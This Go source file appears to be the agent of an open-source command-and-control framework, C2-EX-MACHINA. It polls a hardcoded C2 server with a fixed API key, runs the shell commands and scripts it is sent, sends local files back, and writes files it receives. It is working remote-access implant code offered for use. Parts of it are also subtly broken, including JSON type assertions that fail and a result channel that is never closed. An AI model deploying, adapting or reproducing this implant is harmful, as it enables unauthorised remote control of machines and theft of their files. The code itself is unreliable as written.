/*
	This file implements an agent for C2-EX-MACHINA project.
*/

//	This file implements an agent for C2-EX-MACHINA project.
//	Copyright (C) 2023  C2-EX-MACHINA

//	This program is free software: you can redistribute it and/or modify
//	it under the terms of the GNU General Public License as published by
//	the Free Software Foundation, either version 3 of the License, or
//	(at your option) any later version.

//	This program is distributed in the hope that it will be useful,
//	but WITHOUT ANY WARRANTY; without even the implied warranty of
//	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//	GNU General Public License for more details.

//	You should have received a copy of the GNU General Public License
//	along with this program.  If not, see <https://www.gnu.org/licenses/>.

package main

import (
	"encoding/json"
	"io/ioutil"
	"net/http"
	"runtime"
	"os/exec"
	"strings"
	"strconv"
	"context"
	"bytes"
	"time"
	"fmt"
	"log"
	"os"
	"io"
)

var authors = [2]string{"evaris237", "KrysCat-KitKat"}
var url = "https://github.com/C2-EX-MACHINA/Agent/"
var license = "GPL-3.0 License"
var version = "0.0.1"

var copyright = `
C2-EX-MACHINA  Copyright (C) 2023  C2-EX-MACHINA
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
`

var is_windows = runtime.GOOS == "windows"

/*
	LevelLogger is a Logger that manage levels
	and 5 defaults levels.
*/
type LevelLogger struct {
	*log.Logger
	level int
	format string
	levels map[int]string
}

/*
	THis function makes the default logger.

	format:
	[%(date)] %(levelname) \t(%(levelvalue)) \{\{%(file):%(line)\}\} :: %(message)
*/
func DefaultLogger () LevelLogger {
	logger := LevelLogger{
		log.Default(),
		0,	 // 0 -> all logs (lesser than DEBUG (10) level)
		"\b] %(levelname) \t(%(levelvalue)) {{%(file):%(line)}} :: %s",
		make(map[int]string),
	}

	logger.SetPrefix("[")

	logger.levels[10] = "DEBUG"
	logger.levels[20] = "INFO"
	logger.levels[30] = "WARNING"
	logger.levels[40] = "ERROR"
	logger.levels[50] = "CRITICAL"

	return logger
}

/*
	This function logs messages to stderr.
*/
func (logger *LevelLogger) log (level int, message string) {
	if level < logger.level {
		return
	}

	logstring := strings.Clone(logger.format)
	if strings.Contains(logstring, "%(levelname)") {
		logstring = strings.Replace(
			logstring, "%(levelname)", logger.levels[level], -1,
		)
	}

	if strings.Contains(logstring, "%(levelvalue)") {
		logstring = strings.Replace(
			logstring, "%(levelvalue)", strconv.Itoa(level), -1,
		)
	}

	_, file, line, _ := runtime.Caller(2)
	// /!\ Call from function to call log for specific level
	if strings.Contains(logstring, "%(file)") {
		logstring = strings.Replace(logstring, "%(file)", file, -1)
	}

	if strings.Contains(logstring, "%(line)") {
		logstring = strings.Replace(logstring, "%(line)", strconv.Itoa(line), -1)
	}

	logger.Printf(logstring, message)
}

/*
	This function logs debug message.
*/
func (logger *LevelLogger) debug (message string) {
	logger.log(10, message)
}

/*
	This function logs info message.
*/
func (logger *LevelLogger) info (message string) {
	logger.log(20, message)
}

/*
	This function logs warning message.
*/
func (logger *LevelLogger) warning (message string) {
	logger.log(30, message)
}

/*
	This function logs error message.
*/
func (logger *LevelLogger) error (message string) {
	logger.log(40, message)
}

/*
	This function logs critical message.
*/
func (logger *LevelLogger) critical (message string) {
	logger.log(50, message)
}

var logger = DefaultLogger()

/*
	This type is a task result to store results in a single object.
*/
type TaskResult struct {
	id int
	stdout string
	stderr string
	exit_code int
}

/*
	This function execute a process.
*/
func executeProcess(timeout int, launcher string, arguments ...string) (string, string, int) {
	var stdout, stderr bytes.Buffer
	var cmd *exec.Cmd

	if timeout == 0 {
		logger.debug("Create subprocess without timeout")
		cmd = exec.Command(launcher, arguments...)
	} else {
		logger.debug("Create subprocess with timeout")
		ctx, cancel := context.WithTimeout(
			context.Background(),
			time.Duration(timeout) * time.Second,
		)
		defer cancel()
		cmd = exec.CommandContext(ctx, launcher, arguments...)
	}

	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	error := cmd.Run()
	exit_code := cmd.ProcessState.ExitCode()
	logger.debug("Subprocess terminated.")
	
	if error != nil {
		error_message := error.Error()
		logger.warning(
			fmt.Sprintf(
				"Error executing subprocess, error code: %d (%s)",
				exit_code,
				error_message,
			),
		)
		return "", error_message, exit_code
	}
	
	return stdout.String(), stderr.String(), exit_code
}

/*
	This function performs MEMORYSCRIPT tasks.
*/
func processScriptMemoryTask(task map[string]interface{}) (TaskResult) {
	launcher, _, arguments := getLauncherAndProperties(
		task["Filename"].(string), true,
	)

	stdout, stderr, exit_code := executeProcess(
		getTimeout(task), launcher, arguments...,
	)

	return TaskResult{task["id"].(int), stdout, stderr, exit_code}
}

/*
	This function performs SCRIPT tasks.
*/
func processScriptTask(task map[string]interface{}) (TaskResult) {
	launcher, extension, arguments := getLauncherAndProperties(
		task["Filename"].(string), false,
	)

	filename, error := writeTempfile(extension, task["Data"].(string))

	if error != "" {
		return TaskResult{task["id"].(int), "", error, 1}
	}

	arguments = append(arguments, filename)
	defer os.Remove(filename)

	stdout, stderr, exit_code := executeProcess(
		getTimeout(task), launcher, arguments...,
	)

	return TaskResult{task["id"].(int), stdout, stderr, exit_code}
}

/*
	This function writes temp file.
*/
func writeTempfile(extension string, content string) (string, string) {
	logger.debug(fmt.Sprintf("Write temp file with %s extension", extension))
	file, error := os.CreateTemp("", fmt.Sprintf("*%s", extension))
	
	if error != nil {
		error_message := fmt.Sprintf(
			"Error creating temp file: %s", error.Error(),
		)
		logger.error(error_message)
		return "", error_message
	}

	if _, error := file.Write([]byte(content)); error != nil {
		file.Close()
		error_message := fmt.Sprintf(
			"Error writting temp file: %s", error.Error(),
		)
		logger.error(error_message)
		return "", error_message
	}

	if error := file.Close(); error != nil {
		error_message := fmt.Sprintf(
			"Error closing temp file: %s", error.Error(),
		)
		logger.error(error_message)
		return "", error_message
	}

	return file.Name(), ""
}

/*
	This function defines launcher, file extension and arguments for subprocess.
*/
func getLauncherAndProperties(launcher string, in_memory bool) (string, string, []string) {
	var arguments []string
	var extension string

	if in_memory {
		logger.debug(fmt.Sprintf(
			"Defined launcher for in memory execution with %s", launcher,
		))
		switch launcher {
			case "powershell":
				launcher = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
			case "python3":
				launcher = "/bin/python3"
				arguments = append(arguments, "-c")
			case "python":
				launcher = "/bin/python"
				arguments = append(arguments, "-c")
			case "python2":
				launcher = "/bin/python2"
				arguments = append(arguments, "-c")
			case "perl":
				launcher = "/bin/perl"
				arguments = append(arguments, "-E")
			case "bash":
				launcher = "/bin/bash"
				arguments = append(arguments, "-c")
			case "shell":
				launcher = "/bin/shell"
				arguments = append(arguments, "-c")
			case "batch":
				launcher = "C:\\Windows\\System32\\cmd.exe"
				arguments = append(arguments, "/c")
		}
	} else {
		logger.debug(fmt.Sprintf(
			"Defined launcher and extension for execution with %s", launcher,
		))
		switch launcher {
			case "powershell":
				launcher = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
				extension = "ps1"
			case "python3":
				launcher = "/bin/python3"
				extension = "py"
			case "python":
				launcher = "/bin/python"
				extension = "py"
			case "python2":
				launcher = "/bin/python2"
				extension = "py"
			case "perl":
				launcher = "/bin/perl"
				extension = "pl"
			case "bash":
				launcher = "/bin/bash"
				extension = "sh"
			case "shell":
				launcher = "/bin/shell"
				extension = "sh"
			case "batch":
				launcher = "C:\\Windows\\System32\\cmd.exe"
				extension = "bat"
			case "vbscript":
				launcher = "C:\\Windows\\System32\\cscript.exe"
				extension = "vbs"
			case "jscript":
				launcher = "C:\\Windows\\System32\\cscript.exe"
				extension = "js"
		}
	}

	return launcher, extension, arguments
}

/*
	This function returns a timeout from task (optional in JSON).
*/
func getTimeout(task map[string]interface{}) (int) {
	temp_timeout := task["Timeout"]
	timeout, ok := temp_timeout.(int)

	if !ok {
		logger.debug("No valid timeout found, set timeout to 0")
		return 0
	}
	logger.debug("Timeout defined in JSON")
	return timeout
}

/*
	processCommandTask traite les tâches de type commande et retourne le stdout,
	le stderr et le status de la tâche.
	Elle retourne une erreur si la commande n'a pas pu être exécutée.

	Args:
	- task: la tâche à traiter, sous forme de dictionnaire avec une clé "Data"
		contenant la commande à exécuter

	Returns:
	- stdout: le résultat de la commande exécutée (stdout)
	- stderr: le résultat d'erreurs générées par la commande (stderr)
	- exitCode: le code de sortie de la commande
	- err: une erreur éventuelle rencontrée lors de l'exécution de la commande
*/
func processCommandTask(task map[string]interface{}) (TaskResult) {
	var launcher string
	var arguments []string

	if is_windows {
		launcher, _, arguments = getLauncherAndProperties("batch", true)
	} else {
		launcher, _, arguments = getLauncherAndProperties("shell", true)
	}

	command_string := task["Data"].(string)
	logger.info(
		fmt.Sprintf("Performs COMMAND task: %s", command_string),
	)

	arguments = append(arguments, command_string)
	stdout, stderr, exit_code := executeProcess(
		getTimeout(task), launcher, arguments...,
	)

	return TaskResult{task["id"].(int), stdout, stderr, exit_code}
}

/*
	processUploadTask traite les tâches de type "upload" et retourne le contenu
	du fichier.

	Args:
	- task: la tâche à traiter, sous forme de dictionnaire avec une clé "Data"
	contenant le chemin vers le fichier à lire

	Returns:
	- fileContent: le contenu du fichier lu
	- stderr: une chaîne vide
	- exitCode: 0 (pas d'erreur rencontrée)
	- err: une erreur éventuelle rencontrée lors de la lecture du fichier
*/
func processDownloadTask(task map[string]interface{}) (TaskResult) {
	filename := task["Data"].(string)
	logger.info(
		fmt.Sprintf("Performs DOWNLOAD task: %s", filename),
	)

	fileContent, error := ioutil.ReadFile(filename)
	logger.debug("File read")

	if error != nil {
		error_message := error.Error()
		logger.warning(
			fmt.Sprintf(
				"Error executing DOWNLOAD task, error: %s",
				error_message,
			),
		)
		return TaskResult{task["id"].(int), "", error_message, 1}
	}

	return TaskResult{task["id"].(int), string(fileContent), "", 0}
}

/*
	processDownloadTask traite les tâches de type "download" et écrit le contenu
	reçu dans un fichier.

	Args:
	- task: la tâche à traiter, sous forme de dictionnaire avec une clé "Data"
		contenant le contenu à écrire dans le fichier et une clé "Filename"
		contenant le nom du fichier

	Returns:
	- stdout: une chaîne vide
	- stderr: une chaîne vide
	- exitCode: 0 (pas d'erreur rencontrée)
	- err: une erreur éventuelle rencontrée lors de l'écriture dans le fichier
*/
func processUploadTask(task map[string]interface{}) (TaskResult) {
	filename := task["Filename"].(string)
	logger.info(
		fmt.Sprintf("Performs UPLOAD task: %s", filename),
	)

	error := ioutil.WriteFile(filename, []byte(task["Data"].(string)), 0600)
	logger.debug("File written.")

	if error != nil {
		error_message := error.Error()
		logger.warning(
			fmt.Sprintf(
				"Error executing UPLOAD task, error: %s",
				error_message,
			),
		)
		return TaskResult{task["id"].(int), "", error_message, 1}
	}

	return TaskResult{task["id"].(int), "", "", 0}
}

/*
	cette fonction permet de traiter les taches
	elle retourne le stdout, le stderr et le status de la tache
	elle retourne une erreur si le type de tache n'est pas reconnu
*/
func processTask(task map[string]interface{}, results chan TaskResult) {
	time_to_wait(task["Timestamp"].(int64))
	type_ := task["Type"].(string)
	logger.debug(fmt.Sprintf("Receive %s task", type_))

	switch type_ {
		case "COMMAND":
			results <- processCommandTask(task)
			return
		case "UPLOAD":
			results <- processUploadTask(task)
			return
		case "DOWNLOAD":
			results <- processDownloadTask(task)
			return
		case "MEMORYSCRIPT":
			results <- processScriptMemoryTask(task)
			return
		case "TEMPSCRIPT":
			results <- processScriptTask(task)
			return
	}

	logger.error("Invalid task type")
	results <- TaskResult{task["id"].(int), "", "Invalid task type", 1}
}

/*
	This function adds C2-EX-MACHINA headers to request object.
*/
func addDefaultHeaders (request *http.Request) {
	hostname, error := os.Hostname()

	if error != nil {
		logger.error(
			fmt.Sprintf("Error getting hostname: %s", error.Error()),
		)
		hostname = "Unknown"
	}

	logger.debug("Add HTTP headers")

	request.Header.Set("Content-Type", "application/json; charset=utf-8")
	request.Header.Set(
		"Api-Key",
		"AdminAdminAdminAdminAdminAdminAdminAdminAdminAdmin" +
		"AdminAdminAdminAdminAdminAdminAdmin",
	)
	request.Header.Set(
		"User-Agent",
		fmt.Sprintf(
			"Agent-C2-EX-MACHINA %s (%s) %s",
			version,
			runtime.GOOS,
			hostname,
		),
	)
	request.Header.Set("Content-Type", "application/json; charset=utf-8")
}

/*
	This function creates HTTP request object.
*/
func createRequest (method string, body io.Reader) (*http.Request) {
	request, error := http.NewRequest(
		method,
		"http://127.0.0.1:8000/c2/order/01223456789abcdef",
		body,
	) // bug with nil body, example: https://pkg.go.dev/net/http

	if error != nil {
		logger.error(fmt.Sprintf("Error creating request: %s", error.Error()))
		time.Sleep(5 * time.Second)
		return createRequest(method, body)
	}

	return request
}

/*
	This function sends HTTP request and returns the response body content.
*/
func sendRequest (request *http.Request, client *http.Client) ([]byte) {
	response, error := client.Do(request)
	if error != nil {
		logger.error(fmt.Sprintf("Error sending request: %s", error.Error()))
		time.Sleep(5 * time.Second)
		return sendRequest(request, client)
	}

	defer response.Body.Close()

	logger.debug("Read the response body")
	content, error := ioutil.ReadAll(response.Body)
	if error != nil {
		logger.error(fmt.Sprintf("Error reading response body: %s", error.Error()))
		time.Sleep(5 * time.Second)
		return sendRequest(request, client)
	}

	return content
}

/*
	This function parses tasks, executes it and generates the response.
*/
func processTasks (tasks []interface{}) ([]byte) {
	var body []map[string]interface{}
	logger.debug("Parse JSON")

	results := make(chan TaskResult, len(tasks))

	for _, task := range tasks {
		taskMap, ok := task.(map[string]interface{})
		if !ok {
			logger.error("Invalid JSON task format.")
			return nil
		} else {
			go processTask(taskMap, results)
		}
	}

	for result := range results {
		logger.debug("Generate a task result")
		body = append(body, map[string]interface{}{
			"id":	 result.id,
			"stdout": result.stdout,
			"stderr": result.stderr,
			"status": result.exit_code,
		})
	}

	logger.info("Generate tasks results")
	data, error := json.Marshal(map[string]interface{}{
		"tasks": body,
	})
	if error != nil {
		logger.error(
			fmt.Sprintf("Error encoding JSON payload: %s", error.Error()),
		)
		return nil
	}
	return data
}

/*
	This function waits until the unixepochtime argument.
*/
func time_to_wait(epoch int64) {
	time_to_sleep := epoch - time.Now().Unix()
	if time_to_sleep > 0 {
		logger.debug(fmt.Sprintf("Wait %d seconds", time_to_wait))
		time.Sleep(time.Duration(time_to_sleep) * time.Second)
	}
}

/*
	cette fonction permet de lancer l'agent
	elle est appelee par la fonction main
	elle contient une boucle infinie qui permet de traiter les taches
	elle retourne une erreur si la requete n'a pas pu etre executee
	le header de la requete contient l'api-key, le user-agent et le content-type
	la requete GET permet de recuperer les taches a traiter
	la requete POST permet d'envoyer les resultats des taches traitees

*/
func runAgent() {
	logger.debug("Start agent")
	client := &http.Client{}

	logger.debug("Create first request")
	request := createRequest("GET", nil)
	addDefaultHeaders(request)
	content := sendRequest(request, client)

	for {
		var order map[string]interface{}
		error := json.Unmarshal(content, &order)
		if error != nil {
			logger.error(
				fmt.Sprintf("Error decoding JSON response: %s", error.Error()),
			)
			return
		}

		data := processTasks(order["Tasks"].([]interface{}))
		if data == nil {
			return
		}

		time_to_wait(order["NextRequestTime"].(int64))

		request = createRequest("POST", bytes.NewReader(data))
		addDefaultHeaders(request)
		content = sendRequest(request, client)
	}
}

/*
	This function starts the C2-EX-MACHINA agent.
*/
func main() {
	fmt.Println(copyright)

	fmt.Println(`
	░█████╗░██████╗░░░░░░░███████╗██╗░░██╗░░░░░░███╗░░░███╗░█████╗░░█████╗░██╗░░██╗██╗███╗░░██╗░█████╗░
	██╔══██╗╚════██╗░░░░░░██╔════╝╚██╗██╔╝░░░░░░████╗░████║██╔══██╗██╔══██╗██║░░██║██║████╗░██║██╔══██╗
	██║░░╚═╝░░███╔═╝█████╗█████╗░░░╚███╔╝░█████╗██╔████╔██║███████║██║░░╚═╝███████║██║██╔██╗██║███████║
	██║░░██╗██╔══╝░░╚════╝██╔══╝░░░██╔██╗░╚════╝██║╚██╔╝██║██╔══██║██║░░██╗██╔══██║██║██║╚████║██╔══██║
	╚█████╔╝███████╗░░░░░░███████╗██╔╝╚██╗░░░░░░██║░╚═╝░██║██║░░██║╚█████╔╝██║░░██║██║██║░╚███║██║░░██║
	░╚════╝░╚══════╝░░░░░░╚══════╝╚═╝░░╚═╝░░░░░░╚═╝░░░░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝╚═╝░░╚═╝`)
	
	for {
		runAgent()
		logger.warning("Run agent end, restarting agent...")
		time.Sleep(5 * time.Second)
	}
}
